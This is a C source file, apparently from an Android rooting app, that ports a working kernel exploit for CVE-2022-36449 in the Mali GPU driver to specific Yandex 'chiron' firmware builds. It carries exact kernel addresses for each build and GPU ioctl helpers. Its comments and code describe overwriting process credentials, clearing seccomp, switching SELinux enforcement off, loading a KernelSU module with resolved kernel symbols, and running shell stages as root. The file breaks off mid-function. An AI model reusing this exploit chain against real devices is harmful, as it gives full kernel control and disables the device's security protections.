/*
 * CVE-2022-36449 from inside an Android app (chiron, 5.4.125).
 *
 * Ported from duomax-cve-2022-36449/exploit/root/rootsh.c.tpl, which is proven
 * on this device, with three changes:
 *
 *   1. the linear-map base is derived at runtime from init_task.tasks.next
 *      (read through the physical window) instead of being hard-coded;
 *   2. after the cred patch it also clears task->seccomp.{mode,filter}, which is
 *      what kills an app process with SIGSYS on init_module();
 *   3. it flips selinux_state.enforcing for the module load and restores it.
 *
 * Everything is reported through a text buffer for logcat.
 */
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/xattr.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/utsname.h>
#include <sys/system_properties.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <dirent.h>
#include <android/log.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;
typedef u32 base_mem_alloc_flags;

#include "mali_kbase_ioctl.h"
#include "jm/mali_base_jm_kernel.h"
#include "reclaim_scan.h"
#include "process_wait.h"
#include "backend_registry.h"
#include "adb_uapi.h"
#include "process_console.h"
#include "aio_cleanup.h"

const char *mali_jm_probe(void);

#define BASE_MEM_IMPORT_TYPE_USER_BUFFER 3
struct base_mem_import_user_buffer { u64 ptr; u64 length; };
struct base_external_resource { u64 ext_resource; };

#define PAGE_BYTES 4096UL
#define BLOCK_BYTES (2UL * 1024UL * 1024UL)
#define RING_EVENTS 128u
#define RING_MARK_OFF 0x800u
#define RING_MARK "RECLAIM36449#1"
#define SPRAY_BLOCKS 512
#define IMPORT_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | \
                      BASE_MEM_PROT_CPU_WR | BASE_MEM_CACHED_CPU)
#define SOFT_EVENT_WAIT (BASE_JD_REQ_SOFT_JOB | 0x5)
#define SOFT_EVENT_SET  (BASE_JD_REQ_SOFT_JOB | 0x6)

/* task_struct layout, read off this kernel image (not guessed):
 *   __arm64_sys_getuid   ldr  x8, [x8, #0x6c0]   -> cred, uid at +0x04
 *   __set_task_comm      str  ..., [x20, #0x6d0] -> comm
 *   __secure_computing   ldr  w9, [x8, #0x770]   -> seccomp.mode
 *   __secure_computing   ldr  x10, [x8, #0x30]   -> stack
 *   syscall_trace_enter  ldr  x8, [x20] / tbnz w8, #0xb -> TIF_SECCOMP
 * The task list head (tasks) sits at 0x418: next at 0x418, prev at 0x420.
 */
#define T_TASKS       0x418UL   /* list_head used by the walk below          */
#define T_TASKS_PREV  0x420UL
#define T_STACK       0x030UL
#define T_PID         0x518UL
#define T_TGID        0x51cUL
#define T_REAL_CRED   0x6b8UL
#define T_CRED        0x6c0UL
#define T_COMM        0x6d0UL
#define T_FLAGS       0x000UL   /* thread_info.flags (THREAD_INFO_IN_TASK)  */
#define TIF_SECCOMP   0x800UL   /* bit 11: gates __secure_computing         */
#define T_SECCOMP_MODE   0x770UL
#define T_SECCOMP_FILTER 0x778UL

/* Per-firmware kernel profile.  Every address here is exact for one build:
 * the boot chain has no approximate match, and a wrong profile only reads. */
struct chiroru_vendor_sym { const char *name; uint64_t off; };

struct chiroru_profile {
  const char *id;
  /* Mandatory exact identity gate, shared by all native root entry points. */
  const char *fingerprint;
  const char *incremental;
  const char *kernel_release;
  const char *machine;
  uint64_t image_pa;          /* physical start of the arm64 Image        */
  uint64_t image_size;        /* optional runtime ARM64 header check      */
  uint64_t init_task_pa;      /* physical address of init_task           */
  /* Legacy profiles derive the linear-map base from init_task.tasks.next
   * minus a calibrated physical offset.  Newer profiles read the kernel's
   * own memstart_addr/vabits_actual, which survives any KASLR placement. */
  int use_magic_lbase;
  uint64_t lbase_magic;
  uint64_t memstart_addr_pa;
  uint64_t vabits_actual_pa;
  uint64_t kimage_voffset_pa;
  int modules_supported;
  int direct_adb;             /* load the ADB .ko with init_module, no ksud */
  int direct_ksu;             /* factory: relocate ELF64 from a 32-bit app */
  int vendor_count;
  const struct chiroru_vendor_sym *vendor;
};

static const struct chiroru_vendor_sym vendor_syms_5000001307[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2784ULL},
    {"sys_call_table", 0xEEE6E8ULL},
    {"init_mm", 0x12BE860ULL},
};

/* 5000001307 (Android 11, 5.4.125-ab5000001307).  Unchanged proven path. */
static const struct chiroru_profile profile_5000001307 = {
    .id = "chiron-5000001307",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001307:user/dev-keys",
    .incremental = "5000001307",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001307",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .init_task_pa = 0x22f7500ULL,   /* page 0x22f7000, tasks.next at 0x918 */
    .use_magic_lbase = 1,
    .lbase_magic = 0x56110418ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001307,
};

static const struct chiroru_vendor_sym vendor_syms_1982735225[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE253CULL},
    {"sys_call_table", 0xEEE548ULL},
    {"init_mm", 0x12BE860ULL},
    {"compat_sys_call_table", 0xEF2FD0ULL},
};

/* 5000001245 differs from 5000001307 in exactly one data offset: its
 * sys_call_table starts 0x18 bytes later.  Reading the image at 0xEEE700
 * yields io_setup at slot 0, faccessat at 48, reboot at 142, setresuid at 147,
 * execve at 221 and execveat at 281; the 1307 value would hook three
 * neighbouring syscalls instead.  Text layout and the other three data
 * symbols are identical. */
static const struct chiroru_vendor_sym vendor_syms_5000001245[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2784ULL},
    {"sys_call_table", 0xEEE700ULL},
    {"init_mm", 0x12BE860ULL},
};

/* 1982735225 (factory, Android 11, 5.4.125-ab1982735225, 32-bit userspace).
 * Symbol addresses were recovered from the verified factory image:
 *   init_task           image+0x1277480 -> PA 0x22f7480
 *   memstart_addr       image+0x0fe20c8 -> PA 0x20620c8
 *   vabits_actual       image+0x1017b20 -> PA 0x2097b20
 *   kimage_voffset      image+0x0fe20d8 -> PA 0x20620d8
 * lbase = PAGE_OFFSET - memstart_addr, so it is valid for every boot. */
static const struct chiroru_profile profile_1982735225 = {
    .id = "chiron-1982735225",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/1982735225:user/dev-keys",
    .incremental = "1982735225",
    .kernel_release = "5.4.125-android11-2-g85fe5498964f-ab1982735225",
    .machine = "armv8l",
    .image_pa = 0x1080000ULL,
    .init_task_pa = 0x22f7480ULL,   /* page 0x22f7000, tasks.next at 0x898 */
    .use_magic_lbase = 0,
    .memstart_addr_pa = 0x20620c8ULL,
    .vabits_actual_pa = 0x2097b20ULL,
    .kimage_voffset_pa = 0x20620d8ULL,
    .modules_supported = 1,
    .direct_adb = 1,                /* 32-bit userspace has no 64-bit ksud */
    .direct_ksu = 1,
    .vendor_count = 5,
    .vendor = vendor_syms_1982735225,
};

/* 5000001245 (Android 11, 5.4.125-ab5000001245, 64-bit userspace).
 * Built from the same kernel commit as 5000001307.  The full 21721088-byte
 * image was read back and every one of the 43482 common text symbols has the
 * same offset from _stext; init_task at PA 0x22f7500 and selinux_state at
 * PA 0x24fd000 were checked in place.  Only sys_call_table moved (+0x18),
 * so the profile carries its own vendor array. */
static const struct chiroru_profile profile_5000001245 = {
    .id = "chiron-5000001245",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001245:user/dev-keys",
    .incremental = "5000001245",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001245",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .init_task_pa = 0x22f7500ULL,   /* page 0x22f7000, tasks.next at 0x918 */
    .use_magic_lbase = 1,
    .lbase_magic = 0x56110418ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001245,
};

/* OTA-verified 5000001248 candidate; on-device validation is pending.
 * The syscall table is independently located by seven slots in the OTA Image.
 * Other globals are checked against __primary_switched, arm64_memblock_init,
 * copy_init_mm, selinux_init and selinux_cred_prepare. Use runtime memory-map
 * values rather than importing a calibrated task-list offset from 1245. */
static const struct chiroru_vendor_sym vendor_syms_5000001248[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2784ULL},
    {"sys_call_table", 0xEEE718ULL},
    {"init_mm", 0x12BE860ULL},
};
static const struct chiroru_profile profile_5000001248 = {
    .id = "chiron-5000001248",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001248:user/dev-keys",
    .incremental = "5000001248",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001248",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .image_size = 0x14b7000ULL,
    .init_task_pa = 0x22f7500ULL,
    .use_magic_lbase = 0,
    .memstart_addr_pa = 0x2062310ULL,
    .vabits_actual_pa = 0x2097f28ULL,
    .kimage_voffset_pa = 0x2062320ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001248,
};

/* 5000001289 (OTA, 5.4.125-ab5000001289).  Built from the same kernel commit
 * as 1248, so the text layout and task_struct offsets are identical and only
 * the data symbols moved.  Offsets were read from the OTA Image through
 * __primary_switched, arm64_memblock_init, copy_init_mm and selinux_init, and
 * sys_call_table was located independently by its seven syscall slots. */
static const struct chiroru_vendor_sym vendor_syms_5000001289[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2744ULL},
    {"sys_call_table", 0xEEE6E0ULL},
    {"init_mm", 0x12BE860ULL},
};
static const struct chiroru_profile profile_5000001289 = {
    .id = "chiron-5000001289",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001289:user/dev-keys",
    .incremental = "5000001289",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001289",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .image_size = 0x14b7000ULL,
    .init_task_pa = 0x22f7500ULL,
    .use_magic_lbase = 0,
    .memstart_addr_pa = 0x20622D0ULL,
    .vabits_actual_pa = 0x2097EE8ULL,
    .kimage_voffset_pa = 0x20622E0ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001289,
};

/* 5000001321: exact OTA Image offsets, checked through the corresponding
 * instruction references and seven syscall slots. Memory-map variables are
 * read at runtime after verifying the physical ARM64 Image header. */
static const struct chiroru_vendor_sym vendor_syms_5000001321[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2784ULL},
    {"sys_call_table", 0xEEE6F8ULL},
    {"init_mm", 0x12BE860ULL},
};
static const struct chiroru_profile profile_5000001321 = {
    .id = "chiron-5000001321",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001321:user/dev-keys",
    .incremental = "5000001321",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001321",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .image_size = 0x14b7000ULL,
    .init_task_pa = 0x22f7500ULL,
    .use_magic_lbase = 0,
    .memstart_addr_pa = 0x2062310ULL,
    .vabits_actual_pa = 0x2097F28ULL,
    .kimage_voffset_pa = 0x2062320ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001321,
};

/* 5000001346: addresses derived from this build's RAM Image and independently
 * checked against its decrypted OTA Image. The syscall table sits eight bytes
 * later than on 1321; the other globals used by this profile are unchanged.
 * The embedded kernel configuration matches 1321 byte-for-byte. */
static const struct chiroru_vendor_sym vendor_syms_5000001346[] = {
    {"selinux_state", 0x147CB10ULL},
    {"selinux_blob_sizes", 0xFE2784ULL},
    {"sys_call_table", 0xEEE700ULL},
    {"init_mm", 0x12BE860ULL},
};
static const struct chiroru_profile profile_5000001346 = {
    .id = "chiron-5000001346",
    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001346:user/dev-keys",
    .incremental = "5000001346",
    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001346",
    .machine = "aarch64",
    .image_pa = 0x1080000ULL,
    .image_size = 0x14b7000ULL,
    .init_task_pa = 0x22f7500ULL,
    .use_magic_lbase = 0,
    .memstart_addr_pa = 0x2062310ULL,
    .vabits_actual_pa = 0x2097F28ULL,
    .kimage_voffset_pa = 0x2062320ULL,
    .modules_supported = 1,
    .vendor_count = 4,
    .vendor = vendor_syms_5000001346,
};
#define WALK_SUB       T_TASKS      /* va -> task_struct                    */
#define WALK_PREV_OFF  T_TASKS_PREV /* where the walk reads the next va     */

/* selinux_state.enforcing, as used by the proven selwrite helper */
#define SELINUX_PA     0x24fd000ULL
#define SELINUX_ENF_OFF 0x311ULL
#define SELINUX_ENFORCING_WINDOW_SLOT (RS_ENTRIES - 2)
#define SELINUX_RESTORE_WINDOW_SLOT   (RS_ENTRIES - 1)

#ifndef __NR_io_setup
#define __NR_io_setup 0
#endif
#ifndef __NR_io_destroy
#define __NR_io_destroy 1
#endif

static void rp(struct rpt *r, const char *fmt, ...) {
  va_list ap;
  size_t n;
  if (r->len >= r->cap - 1) return;
  va_start(ap, fmt);
  n = (size_t)vsnprintf(r->buf + r->len, r->cap - r->len, fmt, ap);
  va_end(ap);
  r->len += n;
  if (r->len >= r->cap) r->len = r->cap - 1;
  r->buf[r->len] = 0;
  /* stream to logcat as well: a crash would otherwise swallow the report */
  __android_log_write(ANDROID_LOG_INFO, "MALI36449", r->buf + r->len - n);
}

static int submit(int fd, struct base_jd_atom_v2 *a) {
  struct kbase_ioctl_job_submit r = {
      .addr = (u64)(uintptr_t)a, .nr_atoms = 1, .stride = sizeof(*a)};
  return ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &r) < 0 ? -1 : 0;
}

static int event_read(int fd, int timeout_ms) {
  struct base_jd_event_v2 e;
  struct pollfd p = {.fd = fd, .events = POLLIN};
  if (poll(&p, 1, timeout_ms) <= 0) return -1;
  return read(fd, &e, sizeof(e)) == (int)sizeof(e) ? 0 : -1;
}

static int query(int fd, u64 gpu, u64 *v) {
  union kbase_ioctl_mem_query q = {
      .in = {.gpu_addr = gpu, .query = KBASE_MEM_QUERY_COMMIT_SIZE}};
  if (ioctl(fd, KBASE_IOCTL_MEM_QUERY, &q) < 0) return -1;
  *v = q.out.value;
  return 0;
}

static int wait_commit(int fd, u64 gpu, u64 want, int ms) {
  int t = 0;
  while (t < ms) {
    u64 v = ~0ULL;
    if (query(fd, gpu, &v)) return -1;
    if (v == want) return 0;
    usleep(100000);
    t += 100;
  }
  return -1;
}

static int alloc_page(int fd, void **cpu, u64 *gpu) {
  union kbase_ioctl_mem_alloc a;
  void *p;
  u64 cookie;
  memset(&a, 0, sizeof a);
  a.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
               BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
  a.in.va_pages = 1;
  a.in.commit_pages = 1;
  if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &a) < 0) return -1;
  cookie = a.out.gpu_va;
  p = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
           (off_t)cookie);
  if (p == MAP_FAILED) return -1;
  *(volatile u64 *)p = 0;
  *cpu = p;
  /* A 32-bit process gets GPU VAs above 4 GB, so the CPU address of the
   * mmap is not a valid GPU address there; the driver cookie is.  A 64-bit
   * process's user address is the GPU address. */
#if defined(__arm__)
  *gpu = cookie;
#else
  *gpu = (u64)(uintptr_t)p;
#endif
  return 0;
}

/* One window slot: install, use, close. */
static volatile uint8_t *win_open(volatile uint64_t *table, int idx,
                                  uint64_t live, uint64_t pa,
                                  volatile uint8_t *slot_base) {
  if (!pt_idx_usable((const uint64_t *)table, idx)) return NULL;
  pt_install_window(&table[idx], pt_build_window(live, pa));
  return slot_base + (size_t)idx * PAGE_BYTES;
}

static void win_close(volatile uint64_t *table, int idx) {
  pt_close_window(&table[idx]);
}


/* ------------------------------------------------------------------------
 * Module loading.
 *
 * The kernel exports only a fraction of the symbols kernelsu.ko needs (161
 * undefined symbols here: _stext, avtab_alloc, __arm64_sys_close, ...), so a
 * plain init_module() fails with ENOENT ("Unknown symbol ..."). That is what
 * ksud's insmod solves by looking every undefined symbol up in /proc/kallsyms
 * and writing the address into the module's symbol table as an absolute one.
 * We do the same.
 * ---------------------------------------------------------------------- */

#include <elf.h>

#define MAX_UNDEF 512

struct undef_sym {
  Elf64_Sym *sym;
  char name[80];
  uint64_t addr;
  int found;
};

/* Physical address of _stext, as ksud computes it: start of "Kernel code"
 * plus the 2 KiB image header. */
static int kernel_phys_base(uint64_t *out) {
  FILE *f = fopen("/proc/iomem", "r");
  char line[256];
  if (!f) return -1;
  while (fgets(line, sizeof line, f)) {
    if (strstr(line, "Kernel code")) {
      unsigned long long a = 0;
      if (sscanf(line, " %llx", &a) == 1) {
        fclose(f);
        *out = a + 0x800;
        return 0;
      }
    }
  }
  fclose(f);
  return -1;
}

/* Current _stext (KASLR-slid) from /proc/kallsyms; it is a text symbol, so
 * this kernel's text-only kallsyms does list it. */
static uint64_t kallsyms_stext(void) {
  FILE *f = fopen("/proc/kallsyms", "r");
  char line[512], nm[256];
  unsigned long long a;
  char t;
  uint64_t ret = 0;
  if (!f) return 0;
  while (fgets(line, sizeof line, f)) {
    if (sscanf(line, "%llx %c %255s", &a, &t, nm) == 3 && !strcmp(nm, "_stext")) {
      ret = a;
      break;
    }
  }
  fclose(f);
  return ret;
}

/* Vendor data symbols this kernel neither exports nor lists in kallsyms.
 * Offsets from _stext, recovered from chiron-vmlinux.elf (see
 * tools/patch-ko.py, which does the same on the host). Addresses depend on the
 * KASLR slide, so they must be written for the *current* boot. */
static int patch_vendor_syms(void *buf, size_t len, uint64_t stext,
                             const struct chiroru_profile *prof, int count,
                             struct rpt *r) {
  const struct chiroru_vendor_sym *want = prof->vendor;
  int want_count = prof->vendor_count;
  Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
  Elf64_Shdr *sh;
  const char *strtab;
  Elf64_Sym *syms;
  int i, j, n, symtab = -1, done = 0;

  if (len < sizeof *eh || memcmp(eh->e_ident, ELFMAG, SELFMAG) != 0) return -1;
  if (eh->e_shoff + (uint64_t)eh->e_shnum * eh->e_shentsize > len) return -1;
  sh = (Elf64_Shdr *)((char *)buf + eh->e_shoff);
  for (i = 0; i < eh->e_shnum; i++)
    if (sh[i].sh_type == SHT_SYMTAB) { symtab = i; break; }
  if (symtab < 0 || sh[symtab].sh_link >= eh->e_shnum) return -1;
  strtab = (const char *)buf + sh[sh[symtab].sh_link].sh_offset;
  syms = (Elf64_Sym *)((char *)buf + sh[symtab].sh_offset);
  n = (int)(sh[symtab].sh_size / sizeof(Elf64_Sym));

  for (i = 0; i < n; i++) {
    const char *nm;
    if (syms[i].st_name == 0) continue;
    nm = strtab + syms[i].st_name;
      for (j = 0; j < count && j < want_count; j++) {
      if (!want || strcmp(nm, want[j].name)) continue;
      syms[i].st_shndx = SHN_ABS;
      syms[i].st_value = stext + want[j].off;
      done++;
      rp(r, "vendor sym %s = 0x%llx\n", nm,
         (unsigned long long)syms[i].st_value);
    }
  }
  rp(r, "vendor syms %d/%d patched\n", done, count);
  return done == count ? 0 : -1;
}

static int patch_module_symbols(void *buf, size_t len, struct rpt *r) {
  Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
  Elf64_Shdr *sh;
  const char *strtab;
  Elf64_Sym *syms;
  int i, n, symtab = -1, nu = 0, filled = 0, miss = 0;
  static struct undef_sym u[MAX_UNDEF];

  if (len < sizeof *eh || memcmp(eh->e_ident, ELFMAG, SELFMAG) != 0 ||
      eh->e_ident[EI_CLASS] != ELFCLASS64) {
    rp(r, "module: not an ELF64 image\n");
    return -1;
  }
  if (eh->e_shoff + (uint64_t)eh->e_shnum * eh->e_shentsize > len) {
    rp(r, "module: section headers outside file\n");
    return -1;
  }
  sh = (Elf64_Shdr *)((char *)buf + eh->e_shoff);
  for (i = 0; i < eh->e_shnum; i++)
    if (sh[i].sh_type == SHT_SYMTAB) { symtab = i; break; }
  if (symtab < 0 || sh[symtab].sh_link >= eh->e_shnum) {
    rp(r, "module: no symtab\n");
    return -1;
  }
  strtab = (const char *)buf + sh[sh[symtab].sh_link].sh_offset;
  syms = (Elf64_Sym *)((char *)buf + sh[symtab].sh_offset);
  n = (int)(sh[symtab].sh_size / sizeof(Elf64_Sym));

  for (i = 0; i < n && nu < MAX_UNDEF; i++) {
    const char *nm;
    if (syms[i].st_shndx != SHN_UNDEF || syms[i].st_name == 0) continue;
    nm = strtab + syms[i].st_name;
    if (strlen(nm) >= sizeof u[0].name) continue;
    u[nu].sym = &syms[i];
    strcpy(u[nu].name, nm);
    u[nu].addr = 0;
    u[nu].found = 0;
    nu++;
  }
  rp(r, "module: %d undefined symbols\n", nu);

  {
    FILE *f = fopen("/proc/kallsyms", "r");
    char line[512], nm[256];
    unsigned long long a;
    char t;
    if (!f) { rp(r, "module: kallsyms errno=%d\n", errno); return -1; }
    while (filled < nu && fgets(line, sizeof line, f)) {
      if (sscanf(line, "%llx %c %255s", &a, &t, nm) != 3) continue;
      for (i = 0; i < nu; i++)
        if (!u[i].found && strcmp(u[i].name, nm) == 0) {
          u[i].addr = a; u[i].found = 1; filled++; break;
        }
    }
    fclose(f);
  }

  for (i = 0; i < nu; i++) {
    if (!u[i].found) {
      if (miss < 4) rp(r, "module: unresolved %s\n", u[i].name);
      miss++;
      continue;
    }
    u[i].sym->st_value = u[i].addr;
    u[i].sym->st_shndx = SHN_ABS;
  }
  /* Symbols that are not in kallsyms are exported ones (this kernel's
   * kallsyms is text-only: no d/D/b/B entries), and the kernel resolves them
   * from its export table itself. So a miss here is expected, not fatal. */
  rp(r, "module: resolved %d/%d from kallsyms (rest are exported)\n",
     filled, nu);
  return 0;
}

static int finish_process(pid_t pid, int output_fd, int timeout_ms,
                          char *out, size_t capacity, const char *label,
                          struct rpt *r) {
  struct process_result result = collect_process(pid, output_fd, timeout_ms, out, capacity);
  if (result.timed_out) rp(r, "%s: timeout after %d ms\n", label, timeout_ms);
  if (result.error) rp(r, "%s: wait errno=%d\n", label, result.error);
  rp(r, "%s rc=%d out=%s\n", label, result.exit_code, out);
  if (result.output_truncated) rp(r, "%s: output truncated\n", label);
  return result.exit_code == 0 && !result.timed_out && !result.error ? 0 : -1;
}

/* fork/exec with output capture and a hard deadline: module scripts (Zygisk
 * starts a daemon from post-fs-data) can take tens of seconds. */
static int run_proc(const char *path, char *const argv[], const char *label,
                    int timeout_ms, struct rpt *r) {
  int pfd[2];
  pid_t pid;
  char out[2048];

  if (pipe(pfd) != 0) { rp(r, "%s: pipe errno=%d\n", label, errno); return -1; }
  pid = fork();
  if (pid == 0) {
    if (setpgid(0, 0) != 0) _exit(126);
    int devnull = open("/dev/null", O_RDONLY);
    if (devnull >= 0) { dup2(devnull, 0); close(devnull); }
    dup2(pfd[1], 1);
    dup2(pfd[1], 2);
    close(pfd[0]);
    close(pfd[1]);
    execv(path, argv);
    dprintf(STDERR_FILENO, "execv(%s) failed errno=%d (%s)\n",
            path, errno, strerror(errno));
    _exit(127);
  }
  if (pid < 0) {
    rp(r, "%s: fork errno=%d\n", label, errno);
    close(pfd[0]); close(pfd[1]);
    return -1;
  }
  close(pfd[1]);
  return finish_process(pid, pfd[0], timeout_ms, out, sizeof out, label, r);
}

/* Called only after a successful bootstrap, with Enforcing already restored.
 * Keep the grant fixed to this APK and permission; use the bounded native
 * subprocess runner because only the bootstrap thread has root credentials. */
void chiroru_grant_boot_adb_permission(struct rpt *r) {
  if (getuid() != 0 || geteuid() != 0 || syscall(__NR_gettid) != getpid()) {
    rp(r, "boot_adb: permission grant requires the root main thread\n");
    return;
  }
  char *argv[] = {(char *)"pm", (char *)"grant", (char *)"--user", (char *)"0",
      (char *)"dev.chiron.chiroru", (char *)"android.permission.WRITE_SECURE_SETTINGS", NULL};
  run_proc("/system/bin/pm", argv, "boot_adb permission", 10000, r);
}

/* KernelSU restores Enforcing during insmod. Request its explicit root-domain
 * handoff in a child only; UID 0 by itself is not evidence of the KSU domain.
 * No global permissive window or app allowlist grant is needed for lifecycle. */
static int ksu_grant_root(void) {
  int fd = -1, rc;
  /* Invalid reboot magic is intercepted by the bundled KSU fd API. */
  syscall(__NR_reboot, 0xDEADBEEFUL, 0xCAFEBABEUL, 0, &fd);
  if (fd < 0) return -1;
  rc = ioctl(fd, _IO('K', 1), 0);
  close(fd);
  return rc == 0 ? 0 : -1;
}

/* insmod returns with SELinux Enforcing again, and the app domain may not
 * write the sysctl from there. Restore it from the KSU root domain instead. */
static int restore_kptr_as_ksu(char value) {
  pid_t pid = fork();
  int status = 0;
  if (pid < 0) return -1;
  if (pid == 0) {
    int fd, ok;
    if (setpgid(0, 0) != 0) _exit(126);
    fd = open("/dev/null", O_RDWR);
    if (fd >= 0) { dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); close(fd); }
    if (ksu_grant_root() != 0) _exit(125);
    fd = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
    if (fd < 0) _exit(124);
    ok = write(fd, &value, 1) == 1;
    close(fd);
    _exit(ok ? 0 : 123);
  }
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) { }
  return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : -1;
}

static int run_lifecycle_as_ksu(const char *installer, struct rpt *r) {
  int out_pipe[2];
  pid_t pid;
  char out[8192];

  if (pipe(out_pipe)) {
    rp(r, "KSU lifecycle: pipe errno=%d\n", errno);
    return -1;
  }
  pid = fork();
  if (pid == 0) {
    if (setpgid(0, 0) != 0) _exit(126);
    static const char shell_script[] =
        "boot_id=$(cat /proc/sys/kernel/random/boot_id) || exit 20\n"
        "echo \"lifecycle shell uid=$(id -u) context=$(cat /proc/self/attr/current)\"\n"
        "[ \"$(id -u)\" = 0 ] || exit 21\n"
        "[ \"$(cat /proc/self/attr/current)\" = 'u:r:ksu:s0' ] || exit 22\n"
        "if [ -n \"$1\" ]; then \"$1\" install || exit $?; fi\n"
        "run_stage() {\n"
        "  event=\"$1\"\n"
        "  marker=\"/data/adb/ksu/.chiroru-$boot_id-$event\"\n"
        "  if [ -e \"$marker\" ]; then echo \"$event skipped: already run this boot\"; return 0; fi\n"
        "  : > \"$marker\" || { echo \"$event: cannot create marker\"; return 1; }\n"
        "  /data/adb/ksud \"$event\"\n"
        "  rc=$?\n"
        "  if [ \"$rc\" -ne 0 ]; then rm -f \"$marker\"; fi\n"
        "  echo \"$event rc=$rc\"\n"
        "  return \"$rc\"\n"
        "}\n"
        "run_stage post-fs-data || exit $?\n"
        "run_stage services || exit $?\n"
        "run_stage boot-completed || exit $?\n"
        "exit 0\n";
    char context[128];
    const char target[] = "u:r:ksu:s0";
    ssize_t n;
    int fd;
    char *argv[] = {(char *)"sh", (char *)"-c", (char *)shell_script,
                   (char *)"chiroru-lifecycle", (char *)(installer ? installer : ""), NULL};
    dup2(out_pipe[1], STDOUT_FILENO);
    dup2(out_pipe[1], STDERR_FILENO);
    close(out_pipe[0]); close(out_pipe[1]);
    if (ksu_grant_root() != 0) {
      dprintf(STDERR_FILENO, "KSU root-domain handoff failed errno=%d (%s)\n",
              errno, strerror(errno));
      _exit(125);
    }
    fd = open("/proc/thread-self/attr/current", O_RDONLY | O_CLOEXEC);
    n = fd >= 0 ? read(fd, context, sizeof context - 1) : -1;
    if (fd >= 0) close(fd);
    if (n <= 0) {
      dprintf(STDERR_FILENO, "read KSU context failed errno=%d (%s)\n",
              errno, strerror(errno));
      _exit(125);
    }
    context[n] = 0;
    context[strcspn(context, "\r\n")] = 0;
    if (strcmp(context, target) != 0) {
      dprintf(STDERR_FILENO, "KSU context verification failed: %s\n", context);
      _exit(125);
    }
    execv("/system/bin/sh", argv);
    dprintf(STDERR_FILENO, "exec /system/bin/sh failed errno=%d (%s)\n",
            errno, strerror(errno));
    _exit(127);
  }
  if (pid < 0) {
    rp(r, "KSU lifecycle: fork errno=%d\n", errno);
    close(out_pipe[0]); close(out_pipe[1]);
    return -1;
  }
  close(out_pipe[1]);
  return finish_process(pid, out_pipe[0], 120000, out, sizeof out, "KSU lifecycle", r);
}

/* Run the real ksud: its "insmod" subcommand resolves undefined symbols and
 * keeps the arm64 relocations in range, which a naive symbol-table patch does
 * not ("overflow in relocation type 275"). */
static int run_ksud(const char *ksud, const char *ko, const char *params,
                    struct rpt *r) {
  char *argv[5];
  int kfd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
  char kb[8192];
  int rc;

  while (kfd >= 0 && read(kfd, kb, sizeof kb) > 0) { }
  argv[0] = (char *)ksud;
  argv[1] = (char *)"insmod";
  argv[2] = (char *)ko;
  argv[3] = (char *)params;
  argv[4] = NULL;
  rc = run_proc(ksud, argv, "ksud", 60000, r);

  if (kfd >= 0) {
    char all[8192], *save, *line;
    size_t used2 = 0;
    int n, shown = 0;
    while ((n = (int)read(kfd, kb, sizeof kb)) > 0 && used2 + n < sizeof all) {
      memcpy(all + used2, kb, n);
      used2 += n;
    }
    all[used2] = 0;
    close(kfd);
    for (line = strtok_r(all, "\n", &save); line && shown < 6;
         line = strtok_r(NULL, "\n", &save))
      if (strstr(line, "module") || strstr(line, "kernelsu") ||
          strstr(line, "Unknown symbol") || strstr(line, "reloc")) {
